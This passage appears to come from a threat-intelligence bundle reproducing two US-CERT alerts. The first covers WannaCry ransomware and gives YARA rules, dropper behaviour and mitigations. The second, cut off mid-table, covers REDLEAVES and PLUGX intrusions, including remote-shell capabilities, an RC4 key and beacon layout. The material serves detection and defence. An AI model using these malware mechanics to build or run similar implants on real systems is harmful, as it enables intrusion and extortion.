users.</em></p><p>Review US-CERT’s Alert on <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a> and consider implementing the following best practices:</p><ol><li>Segregate networks and functions.</li><li>Limit unnecessary lateral communications.</li><li>Harden network devices.</li><li>Secure access to infrastructure devices.</li><li>Perform out-of-band network management.</li><li>Validate integrity of hardware and software.</li></ol><p><strong><u>Recommended Steps for Remediation</u></strong></p><ul><li>Contact law enforcement. We strongly encourage you to contact a local FBI field office upon discovery to report an intrusion and request assistance. Maintain and provide relevant logs.</li><li>Implement your security incident response and business continuity plan. Ideally, organizations should ensure they have appropriate backups so their response is simply to restore the data from a known clean backup. </li></ul><p><strong><u>Defending Against Ransomware Generally</u></strong></p><p>Precautionary measures to mitigate ransomware threats include:</p><ul><li>Ensure anti-virus software is up-to-date.</li><li>Implement a data back-up and recovery plan to maintain copies of sensitive or proprietary data in a separate and secure location. Backup copies of sensitive data should not be readily accessible from local networks.</li><li>Scrutinize links contained in emails, and do not open attachments included in unsolicited emails.</li><li>Only download software—especially free software—from sites you know and trust.</li><li>Enable automated patches for your operating system and Web browser.</li></ul><p><strong><u>Report Notice</u></strong></p><p>DHS and FBI encourages recipients who identify the use of tool(s) or techniques discussed in this document to report information to DHS or law enforcement immediately. We encourage you to contact DHS’s National Cybersecurity and Communications Integration Center (NCCIC) (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov</a> or 888-282-0870), or the FBI through a local field office or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@ic.fbi.gov \">CyWatch@ic.fbi.gov </a>or 855-292-3937) to report an intrusion and to request incident response resources or technical assistance.</p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://blog.malwarebytes.com/cybercrime/2017/05/wanacrypt0r-ransomware-hits-it-big-just-before-the-weekend/\">Malwarebytes LABS: WanaCrypt0r ransomware hits it big just before the weekend</a></li>\n\t\t\t\t\t<li><a href=\"https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/\">Malwarebytes LABS: The worm that spreads WanaCrypt0r</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\">Microsoft: Microsoft Security Bulletin MS17-010</a></li>\n\t\t\t\t\t<li><a href=\"https://www.forbes.com/sites/thomasbrewster/2017/05/12/nsa-exploit-used-by-wannacry-ransomware-in-global-explosion/#4fb6a207e599\">Forbes: An NSA Cyber Weapon Might Be Behind A Massive Global Ransomware Outbreak</a></li>\n\t\t\t\t\t<li><a href=\"http://www.reuters.com/article/us-britain-security-hospitals-ransomware-idUSKBN1882O2\">Reuters: Factbox: Don't click - What is the 'ransomware' WannaCry worm?</a></li>\n\t\t\t\t\t<li><a href=\"https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168\">GitHubGist: WannaCry|WannaDecrypt0r NSA-Cyberweapon-Powered Ransomware Worm</a></li>\n\t\t\t\t\t<li><a href=\"http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598\">Microsoft: Microsoft Update Catalog: Patches for Windows XP, Windows 8, and Windows Server 2003, (KB4012598)</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/05/wannacry.html\">Cisco: Player 3 Has Entered the Game: Say Hello to 'WannaCry'</a></li>\n\t\t\t\t\t<li><a href=\"https://www.washingtonpost.com/business/economy/more-than-150-countries-affected-by-massive-cyberattack-europol-says/2017/05/14/5091465e-3899-11e7-9e48-c4f199710b69_story.html\">Washington Post: More than 150 countries affected by massive cyberattack, Europol says</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>May 12, 2017: Initial post</li>\n\t\t\t\t\t\t<li>May 14, 2017: Corrected Syntax in the second Yara Rule</li>\n\t\t\t\t\t\t<li>May 14, 2017: Added Microsoft link to patches for Windows XP, Windows 8, and Windows Server 2003</li>\n\t\t\t\t\t\t<li>May 14, 2017: Corrected Syntax in the first Yara Rule</li>\n\t\t\t\t\t\t<li>May 16, 2017: Provided further analysis and new IOCs in STIX format</li>\n\t\t\t\t\t\t<li>May 18, 2017: Provided initial IOCs in a STIX format</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />",
			"external_references": [
				{
					"external_id": "8910 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA17-132A",
					"source_name": "open source",
					"description": "Original release date: May 12, 2017 | Last revised: May 19, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Microsoft Windows operating systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>According to numerous open-source reports, a widespread ransomware campaign is affecting various organizations with reports of tens of thousands of infections in over 150 countries, including the United States, United Kingdom, Spain, Russia, Taiwan, France, and Japan. The software can run in as many as 27 different languages.</p><p>The latest version of this ransomware variant, known as WannaCry, WCry, or Wanna Decryptor, was discovered the morning of May 12, 2017, by an independent security researcher and has spread rapidly over several hours, with initial reports beginning around 4:00 AM EDT, May 12, 2017. Open-source reporting indicates a requested ransom of .1781 bitcoins, roughly $300 U.S.<br /><br />This Alert is the result of efforts between the Department of Homeland Security (DHS) National Cybersecurity and Communications Integration Center (NCCIC) and the Federal Bureau of Investigation (FBI) to highlight known cyber threats. DHS and the FBI continue to pursue related information of threats to federal, state, and local government systems and as such, further releases of technical information may be forthcoming.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Initial reports indicate the hacker or hacking group behind the WannaCry campaign is gaining access to enterprise servers through the exploitation of a critical Windows SMB vulnerability. Microsoft released a security update for the <a href=\"https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\">MS17-010</a> vulnerability on March 14, 2017. Additionally, Microsoft released patches for <a href=\"http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598\">Windows XP, Windows 8, and Windows Server 2003</a> operating systems on May 13, 2017. </p><p>According to open sources, one possible infection vector may be through phishing.</p><h3>Technical Details</h3><h4><em>Indicators of Compromise (IOC)</em></h4><p>See <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_WannaCry.xlsx\">TA17-132A_WannaCry.xlsx</a> and <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_WannaCry_stix.xml\">TA17-132A_WannaCry_stix.xml</a> for IOCs developed immediately after WannaCry ransomware appeared. These links contain identical content in two different formats.</p><p>See <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_stix.xml\">TA17-132A_stix.xml</a> for IOCs developed after further analysis of the WannaCry malware.</p><h4><em>Analysis</em></h4><p>Three files were submitted to US-CERT for analysis. All files are confirmed as components of a ransomware campaign identified as \"WannaCry\", a.k.a \"WannaCrypt\" or \".wnCry\". The first file is a dropper, which contains and runs the ransomware, propagating via the MS17-010/EternalBlue SMBv1.0 exploit. The remaining two files are ransomware components containing encrypted plug-ins responsible for encrypting the victim users files. For a list of IOCs found during analysis, see the <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-132A_stix.xml\">STIX</a> file.</p><p>Displayed below are YARA signatures that can be used to detect the ransomware:</p><h4><em>Yara Signatures</em></h4><table border=\"1\" bordercolor=\"#ccc\" cellpadding=\"5\" cellspacing=\"0\" class=\"general-table\" style=\"border-collapse: collapse;\"><tbody><tr><td><p><code>rule Wanna_Cry_Ransomware_Generic {</code></p><p><code>       meta:</code></p><p><code>              description = \"Detects WannaCry Ransomware on Disk and in Virtual Page\"</code></p><p><code>              author = \"US-CERT Code Analysis Team\"</code></p><p><code>              reference = \"not set\"                                        </code></p><p><code>              date = \"2017/05/12\"</code></p><p><code>       hash0 = \"4DA1F312A214C07143ABEEAFB695D904\"</code></p><p><code>       strings:</code></p><p><code>              $s0 = {410044004D0049004E0024}</code></p><p><code>              $s1 = \"WannaDecryptor\"</code></p><p><code>              $s2 = \"WANNACRY\"</code></p><p><code>              $s3 = \"Microsoft Enhanced RSA and AES Cryptographic\"</code></p><p><code>              $s4 = \"PKS\"</code></p><p><code>              $s5 = \"StartTask\"</code></p><p><code>              $s6 = \"wcry@123\"</code></p><p><code>              $s7 = {2F6600002F72}</code></p><p><code>              $s8 = \"unzip 0.15 Copyrigh\"</code></p><p><code>              $s9 = \"Global\\\\WINDOWS_TASKOSHT_MUTEX\"</code>        </p><p> <code>             <code>$</code>s10 = \"Global\\\\WINDOWS_TASKCST_MUTEX\"</code>   </p><p><code>             $s11 = {7461736B736368652E657865000000005461736B5374617274000000742E776E7279000069636163}</code></p><p><code>             $s12 = {6C73202E202F6772616E742045766572796F6E653A46202F54202F43202F5100617474726962202B68}</code></p><p><code>             $s13 = \"WNcry@2ol7\"</code></p><p><code>             $s14 = \"wcry@123\"</code></p><p><code>             $s15 = \"Global\\\\MsWinZonesCacheCounterMutexA\"</code></p><p><code>       condition:</code></p><p><code>              $s0 and $s1 and $s2 and $s3 or $s4 and $s5 and $s6 and $s7 or $s8 and $s9 and $s10 or $s11 and $s12 or $s13 or $s14 or $s15</code></p><p><code>}</code></p><p><code>/*The following Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.*/</code></p><p><code>rule MS17_010_WanaCry_worm {</code></p><p><code>       meta:</code></p><p><code>              description = \"Worm exploiting MS17-010 and dropping WannaCry Ransomware\"</code></p><p><code>              author = \"Felipe Molina (@felmoltor)\"</code></p><p><code>              reference = \"https://www.exploit-db.com/exploits/41987/\"</code></p><p><code>              date = \"2017/05/12\"</code></p><p><code>       strings:</code></p><p><code>              $ms17010_str1=\"PC NETWORK PROGRAM 1.0\"</code></p><p><code>              $ms17010_str2=\"LANMAN1.0\"</code></p><p><code>              $ms17010_str3=\"Windows for Workgroups 3.1a\"</code></p><p><code>              $ms17010_str4=\"__TREEID__PLACEHOLDER__\"</code></p><p><code>              $ms17010_str5=\"__USERID__PLACEHOLDER__\"</code></p><p><code>              $wannacry_payload_substr1 = \"h6agLCqPqVyXi2VSQ8O6Yb9ijBX54j\"</code></p><p><code>              $wannacry_payload_substr2 = \"h54WfF9cGigWFEx92bzmOd0UOaZlM\"</code></p><p><code>              $wannacry_payload_substr3 = \"tpGFEoLOU6+5I78Toh/nHs/RAP\"</code></p><p><code>       condition:</code></p><p><code>              all of them</code></p><p><code>}</code></p></td></tr></tbody></table><h4><em>Dropper</em></h4><p>This artifact (5bef35496fcbdbe841c82f4d1ab8b7c2) is a malicious PE32 executable that has been identified as a WannaCry ransomware dropper. Upon execution, the dropper attempts to connect to the following hard-coded URI:</p><p><code>http[:]//www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com.</code></p><p>Displayed below is a sample request observed:</p><p><code>--Begin request—</code></p><p><code>GET / HTTP/1.1<br />Host: www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com<br />Cache-Control: no-cache</code></p><p><code>--End request--</code></p><p>If a connection is established, the dropper will terminate execution. If the connection fails, the dropper will infect the system with ransomware.<br />When executed, the malware is designed to run as a service with the parameters “-m security”. During runtime, the malware determines the<br />number of arguments passed during execution. If the arguments passed are less than two, the dropper proceeds to install itself as the<br />following service:</p><p><code>--Begin service--</code></p><p><code>ServiceName = \"mssecsvc2.0\"<br />DisplayName = \"Microsoft Security Center (2.0) Service\"<br />StartType = SERVICE_AUTO_START<br />BinaryPathName = \"%current directory%5bef35496fcbdbe841c82f4d1ab8b7c2.exe -m security\"</code></p><p><code>--End service--</code></p><p>Once the malware starts as a service named mssecsvc2.0, the dropper attempts to create and scan a list of IP ranges on the local network<br />and attempts to connect using UDP ports 137, 138 and TCP ports 139, 445. If a connection to port 445 is successful, it creates an additional<br />thread to propagate by exploiting the SMBv1 vulnerability documented by Microsoft Security bulliten MS17-010. The malware then extracts &amp;<br />installs a PE32 binary from it's resource section named \"R\". This binary has been identified as the ransomware component of WannaCrypt.<br />The dropper installs this binary into \"C:\\WINDOWS\\tasksche.exe.\" The dropper executes tasksche.exe with the following command:</p><p><code>--Begin command--</code></p><p><code>\"C:\\WINDOWS\\tasksche.exe /i\"</code></p><p><code>--End command—</code></p><p>Note:<br />=====<br />When this sample was initially discovered, the domain \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com\" was not registered, allowing the<br />malware to run and propagate freely. However within a few days, researchers learned that by registering the domain and allowing the<br />malware to connect, it's ability to spread was greatly reduced. At this time, all traffic to \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" is<br />re-directed to a monitored, non-malicious server, causing the malware to terminate if it is allowed to connect. For this reason, we recommend<br />that administrators and network security personnel not block traffic to this domain.</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>Ransomware not only targets home users; businesses can also become infected with ransomware, leading to negative consequences, including</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul><p>Paying the ransom does not guarantee the encrypted files will be released; it only guarantees that the malicious actors receive the victim’s money, and in some cases, their banking information. In addition, decrypting files does not mean the malware infection itself has been removed.</p>\t\t\n\t\t<h3>Solution</h3>\n\t\t<p><strong><u>Recommended Steps for Prevention </u></strong></p><ul><li>Apply the Microsoft patch for the MS17-010 SMB vulnerability dated March 14, 2017.</li><li>Enable strong spam filters to prevent phishing emails from reaching the end users and authenticate in-bound email using technologies like Sender Policy Framework (SPF), Domain Message Authentication Reporting and Conformance (DMARC), and DomainKeys Identified Mail (DKIM) to prevent email spoofing. </li><li>Scan all incoming and outgoing emails to detect threats and filter executable files from reaching the end users.</li><li>Ensure anti-virus and anti-malware solutions are set to automatically conduct regular scans.</li><li>Manage the use of privileged accounts. Implement the principle of least privilege. No users should be assigned administrative access unless absolutely needed. Those with a need for administrator accounts should only use them when necessary. </li><li>Configure access controls including file, directory, and network share permissions with least privilege in mind. If a user only needs to read specific files, they should not have write access to those files, directories, or shares. </li><li>Disable macro scripts from Microsoft Office files transmitted via email. Consider using Office Viewer software to open Microsoft Office files transmitted via email instead of full Office suite applications.</li><li>Develop, institute, and practice employee education programs for identifying scams, malicious links, and attempted social engineering.</li><li>Run regular penetration tests against the network, no less than once a year. Ideally, run these as often as possible and practical.</li><li>Test your backups to ensure they work correctly upon use.</li></ul><p><strong><u>Recommendations for Network Protection </u></strong></p><p>Apply the patch (MS17-010). If the patch cannot be applied, consider:</p><ul><li>Disabling SMBv1 and</li><li>blocking all versions of SMB at the network boundary by blocking TCP port 445 with related protocols on UDP ports 137-138 and TCP port 139, for all boundary devices.</li></ul><p><em><strong>Note:</strong> disabling or blocking SMB may create problems by obstructing access to shared files, data, or devices. The benefits of mitigation should be weighed against potential disruptions to users.</em></p><p>Review US-CERT’s Alert on <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a> and consider implementing the following best practices:</p><ol><li>Segregate networks and functions.</li><li>Limit unnecessary lateral communications.</li><li>Harden network devices.</li><li>Secure access to infrastructure devices.</li><li>Perform out-of-band network management.</li><li>Validate integrity of hardware and software.</li></ol><p><strong><u>Recommended Steps for Remediation</u></strong></p><ul><li>Contact law enforcement. We strongly encourage you to contact a local FBI field office upon discovery to report an intrusion and request assistance. Maintain and provide relevant logs.</li><li>Implement your security incident response and business continuity plan. Ideally, organizations should ensure they have appropriate backups so their response is simply to restore the data from a known clean backup. </li></ul><p><strong><u>Defending Against Ransomware Generally</u></strong></p><p>Precautionary measures to mitigate ransomware threats include:</p><ul><li>Ensure anti-virus software is up-to-date.</li><li>Implement a data back-up and recovery plan to maintain copies of sensitive or proprietary data in a separate and secure location. Backup copies of sensitive data should not be readily accessible from local networks.</li><li>Scrutinize links contained in emails, and do not open attachments included in unsolicited emails.</li><li>Only download software—especially free software—from sites you know and trust.</li><li>Enable automated patches for your operating system and Web browser.</li></ul><p><strong><u>Report Notice</u></strong></p><p>DHS and FBI encourages recipients who identify the use of tool(s) or techniques discussed in this document to report information to DHS or law enforcement immediately. We encourage you to contact DHS’s National Cybersecurity and Communications Integration Center (NCCIC) (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov</a> or 888-282-0870), or the FBI through a local field office or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@ic.fbi.gov \">CyWatch@ic.fbi.gov </a>or 855-292-3937) to report an intrusion and to request incident response resources or technical assistance.</p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t\t<li><a href=\"https://blog.malwarebytes.com/cybercrime/2017/05/wanacrypt0r-ransomware-hits-it-big-just-before-the-weekend/\">Malwarebytes LABS: WanaCrypt0r ransomware hits it big just before the weekend</a></li>\n\t\t\t\t\t<li><a href=\"https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/\">Malwarebytes LABS: The worm that spreads WanaCrypt0r</a></li>\n\t\t\t\t\t<li><a href=\"https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\">Microsoft: Microsoft Security Bulletin MS17-010</a></li>\n\t\t\t\t\t<li><a href=\"https://www.forbes.com/sites/thomasbrewster/2017/05/12/nsa-exploit-used-by-wannacry-ransomware-in-global-explosion/#4fb6a207e599\">Forbes: An NSA Cyber Weapon Might Be Behind A Massive Global Ransomware Outbreak</a></li>\n\t\t\t\t\t<li><a href=\"http://www.reuters.com/article/us-britain-security-hospitals-ransomware-idUSKBN1882O2\">Reuters: Factbox: Don't click - What is the 'ransomware' WannaCry worm?</a></li>\n\t\t\t\t\t<li><a href=\"https://gist.github.com/rain-1/989428fa5504f378b993ee6efbc0b168\">GitHubGist: WannaCry|WannaDecrypt0r NSA-Cyberweapon-Powered Ransomware Worm</a></li>\n\t\t\t\t\t<li><a href=\"http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598\">Microsoft: Microsoft Update Catalog: Patches for Windows XP, Windows 8, and Windows Server 2003, (KB4012598)</a></li>\n\t\t\t\t\t<li><a href=\"http://blog.talosintelligence.com/2017/05/wannacry.html\">Cisco: Player 3 Has Entered the Game: Say Hello to 'WannaCry'</a></li>\n\t\t\t\t\t<li><a href=\"https://www.washingtonpost.com/business/economy/more-than-150-countries-affected-by-massive-cyberattack-europol-says/2017/05/14/5091465e-3899-11e7-9e48-c4f199710b69_story.html\">Washington Post: More than 150 countries affected by massive cyberattack, Europol says</a></li>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>May 12, 2017: Initial post</li>\n\t\t\t\t\t\t<li>May 14, 2017: Corrected Syntax in the second Yara Rule</li>\n\t\t\t\t\t\t<li>May 14, 2017: Added Microsoft link to patches for Windows XP, Windows 8, and Windows Server 2003</li>\n\t\t\t\t\t\t<li>May 14, 2017: Corrected Syntax in the first Yara Rule</li>\n\t\t\t\t\t\t<li>May 16, 2017: Provided further analysis and new IOCs in STIX format</li>\n\t\t\t\t\t\t<li>May 18, 2017: Provided initial IOCs in a STIX format</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-05-13T01:36:36.000Z"
		},
		{
			"type": "report",
			"title": "TA17-117A: Intrusions Affecting Multiple Victims Across Multiple Sectors",
			"name": "TA17-117A: Intrusions Affecting Multiple Victims Across Multiple Sectors",
			"id": "report-60182eb5-cae3-4dd1-9fce-97f6be6b9670",
			"description": "Original release date: April 27, 2017 | Last revised: May 14, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<p>Networked Systems</p>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>The National Cybersecurity and Communications Integration Center (NCCIC) has become aware of an emerging sophisticated campaign, occurring since at least May 2016, that uses multiple malware implants. Initial victims have been identified in several sectors, including Information Technology, Energy, Healthcare and Public Health, Communications, and Critical Manufacturing.</p><p>According to preliminary analysis, threat actors appear to be leveraging stolen administrative credentials (local and domain) and certificates, along with placing sophisticated malware implants on critical systems. Some of the campaign victims have been IT service providers, where credential compromises could potentially be leveraged to access customer environments. Depending on the defensive mitigations in place, the threat actor could possibly gain full access to networks and data in a way that appears legitimate to existing monitoring tools.</p><p>Although this activity is still under investigation, NCCIC is sharing this information to provide organizations information for the detection of potential compromises within their organizations.</p><p>NCCIC will update this document as information becomes available.</p><p>For a downloadable copy of this report and listings of IOCs, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/IR-ALERT-MED-17-093-01C-Intrusions_Affecting_Multiple_Victims_Across_Multiple_Sectors.pdf\">Report (.pdf)</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/IR-ALERT-MED-17-093-01C.xlsx\">IOCs (.xlsx)</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/IR-ALERT-MED-17-093-01-C.XML\">IOCs (STIX)</a></li></ul><p>To report activity related to this Incident Report Alert, please contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 1-888-282-0870.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<h3>Risk Evaluation</h3><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 19px;\"><p align=\"center\"><strong>NCCIC Cyber Incident Scoring System (NCISS) Rating Priority Level (Color) </strong></p></td></tr><tr><td style=\"width: 100%; height: 19px;\"><p>Yellow (Medium)</p></td></tr><tr><td style=\"width: 100%; height: 10px;\"><p>A medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.</p></td></tr></tbody></table><h3>Details</h3><p>While NCCIC continues to work with a variety of victims across different sectors, the adversaries in this campaign continue to affect several IT service providers. To achieve operational efficiencies and effectiveness, many IT service providers often leverage common core infrastructure that should be logically isolated to support multiple clients.</p><p>Intrusions into these providers create opportunities for the adversary to leverage stolen credentials to access customer environments within the provider network.</p><p><img align=\"middle\" alt=\"Figure 1: Structure of a traditional business network and an IT service provider network\" src=\"https://www.us-cert.gov/sites/default/files/publications/IT%20service%20provider%20network.png\" style=\"width: 631px; height: 402px;\" /></p><p><em>Figure 1: Structure of a traditional business network and an IT service provider network</em></p><h3>Technical Analysis</h3><p>The threat actors in this campaign have been observed employing a variety of tactics, techniques, and procedures (TTPs). The actors use malware implants to acquire legitimate credentials then leverage those credentials to pivot throughout the local environment. NCCIC is aware of several compromises involving the exploitation of system administrators’ credentials to access trusted domains as well as the malicious use of certificates. Additionally, the adversary makes heavy use of PowerShell and the open source PowerSploit tool to enable assessment, reconnaissance, and lateral movement.</p><p>Command and Control (C2) primarily occurs using RC4 cipher communications over port 443 to domains that change IP addresses. Many of these domains spoof legitimate sites and content, with a particular focus on spoofing Windows update sites. Most of the known domains leverage dynamic DNS services, and this pattern adds to the complexity of tracking this activity. Listings of observed domains are found in this document’s associated STIX package and .xlsx file. The indicators should be used to observe potential malicious activity on your network.</p><p>User impersonation via compromised credentials is the primary mechanism used by the adversary. However, a secondary technique to maintain persistence and provide additional access into the victim network is the use of malware implants left behind on key relay and staging machines. In some instances, the malware has only been found within memory with no on-disk evidence available for examination. To date, the actors have deployed multiple malware families and variants, some of which are currently not detected by anti-virus signatures. The observed malware includes PLUGX/SOGU and REDLEAVES. Although the observed malware is based on existing malware code, the actors have modified it to improve effectiveness and avoid detection by existing signatures.</p><p>Both REDLEAVES and PLUGX have been observed being executed on systems via dynamic-link library (DLL) side-loading. The DLL side-loading technique utilized by these malware families typically involves three files: a non-malicious executable, a malicious DLL loader, and an encoded payload file. The malicious DLL is named as one of the DLLs that the executable would normally load and is responsible for decoding and executing the payload into memory.</p><h3>REDLEAVES Malware</h3><p>The most unique implant observed in this campaign is the REDLEAVES malware. The REDLEAVES implant consists of three parts: an executable, a loader, and the implant shellcode. The REDLEAVES implant is a remote administration Trojan (RAT) that is built in Visual C++ and makes heavy use of thread generation during its execution. The implant contains a number of functions typical of RATs, including system enumeration and creating a remote shell back to the C2.</p><h4>Capabilities</h4><p><strong>System Enumeration</strong>. The implant is capable of enumerating the following information about the victim system and passing it back to the C2:</p><ul><li>system name,</li><li>system architecture (x86 or x64),</li><li>operating system major and minor versions,</li><li>amount of available memory,</li><li>processor specifications,</li><li>language of the user,</li><li>privileges of the current process,</li><li>group permissions of the current user,</li><li>system uptime,</li><li>IP address, and</li><li>primary drive storage utilization.</li></ul><p><strong>Command Execution.</strong> The implant can execute a command directly inside a command shell using native Windows functionality by passing the command to run to cmd.exe with the “/c” option (“cmd.exe /c &lt;command&gt;”).</p><p><strong>Command Window Generation.</strong> The implant can also execute commands via a remote shell that is generated and passed through a named pipe. A command window is piped back to the C2 over the network as a remote shell or alternatively to another process or thread that can communicate with that pipe. The implant uses the mutexRedLeavesCMDSimulatorMutex.</p><p><strong>File System Enumeration.</strong> The implant has the ability to enumerate data within a specified directory, where it gathers filenames, last file write times, and file sizes.</p><p><strong>Network Traffic Compression and Encryption.</strong> The implant uses a form of LZO compression to compress data that is sent to its C2. After compression, the data for this implant sample is then RC4-ciphered with the key 0x6A6F686E3132333400 (this corresponds to the string “john1234” with the null byte appended).</p><p>Network Communications REDLEAVES connects to the C2 over TCP port 443, but does not use the secure flag when calling the API function InternetOpenUrlW. The data is not encrypted and there is no SSL handshake as would normally occur with port 443 traffic, but rather the data is transmitted in the form that is generated by the RC4 cipher.</p><p>Current REDLEAVES samples that have been examined have a hard-coded C2. Inside the implant’s configuration block in memory were the strings in Table 1.</p><div style=\"clear: both;\"><em>Table 1: REDLEAVES Sample Strings Found in C2</em></div><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p><code>QN4869MD ­­– mutex used to determine if the implant is already running (Varies from sample to sample)</code></p><p><code>2016-5-1-INCO –Unknown</code></p><p><code>%windir.\\system32\\svchost.exe - process that the implant was injected into</code></p><p><code>john1234 (with the null byte afterward) – RC4 Key</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p>While the name of the initial mutex, QN4869MD in this sample, varies among REDLEAVES samples, the RedLeavesCMDSimulatorMutex mutex name appears to be consistent. Table 2 contains a sample of the implant communications to the domain windowsupdates.dnset[.]com over TCP port 443.</p><p><em>Table 2: REDLEAVES Sample Beacon</em></p><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\" width=\"100%\"><tbody><tr><td style=\"width: 100%; height: 232px;\"><p><code>--- BEGIN SAMPLE BEACON ---</code></p><p><code>00000000 c1 0c 00 00 7a 8d 9b dc 88 00 00 00 ....z... ....</code></p><p><code>0000000C 14 6f 68 6e 16 6f 68 6e c4 a4 b1 d1 c4 e6 24 eb .ohn.ohn ......$.</code></p><p><code>0000001C cf 49 81 a7 a1 c7 96 ff 6d 31 b4 48 8b 3e a3 c1 .I...... m1.H.&gt;..</code></p><p><code>0000002C 92 e2 c3 7c e4 4c cf e9 e1 fa fb 6a fa 66 2c bf ...|.L.. ...j.f,.</code></p><p><code>0000004C 7b 13 a7 30 17 3d eb fb d3 16 0e 96 83 21 2e 73 {..0.=.. .....!.s</code></p><p><code>0000005C dc 44 a2 72 fb f4 5e d0 4d b7 85 be 33 cd 13 21 .D.r..^. M...3..!</code></p><p><code>0000006C 3f e2 63 da da 5b 5e 52 9a 9c 20 36 69 cb cd 79 ?.c..[^R .. 6i..y</code></p><p><code>0000007C 13 79 7a d4 ed 63 b7 41 5d 38 b4 c2 84 74 98 cd .yz..c.A ]8...t..</code></p><p><code>0000008C f8 32 49 ef 2d e7 f2 ed .2I.-...</code></p><p><code>0000003C 5e 4b 72 6a f9 47 86 cd f1 cd 6d b5 24 79 3c 59 ^Krj.G.. ..m.$y</code></p><p><code>--- END SAMPLE BEACON ---</code></p></td></tr></tbody></table><div style=\"clear: both;\"> </div><p>REDLEAVES network traffic has two 12-byte fixed-length headers in front of each RC4-encrypted compressed payload. The first header comes in its own packet, with the second header and the payload following in a separate packet within the same TCP stream. The last four bytes of the first header contain the number of the remaining bytes in little-endian format (0x88 in the sample beacon above).</p><p>The second header, starting at position 0x0C, is XOR’d with the first four bytes of the key that is used to encrypt the payload. In the case of this sample, those first four bytes would be “john” (or 0x6a6f686e using the ASCII hex codes). After the XOR operation, the bytes in positions 0x0C through 0x0F contain the length of the decrypted and decompressed payload. The bytes in positions 0x10 through 0x13 contain the length of the encrypted and compressed payload.</p><p>To demonstrate, in the sample beacon, the second header follows:</p><p>0000000C 14 6f 68 6e 16 6f 68 6e c4 a4 b1 d1</p><p>The length of the decrypted and decompressed payload is 0x7e000000 in little-endian format (0x146f686e XOR 0x6a6f686e). The length of the encrypted and compressed payload is 0x7c000000 in little-endian (0x166f686e XOR 0x6a6f686e). This is verified by referring back to the sample beacon which had the number of remaining bytes set to 0x88 and subtracting the length of the second header (0x88 – 0xC = 0x7c).</p><h4>Strings</h4><p><em>Note: Use caution when searching based on strings, as common strings may cause a large number of false positives.</em></p><p><em>Table 3: Strings Appearing in the 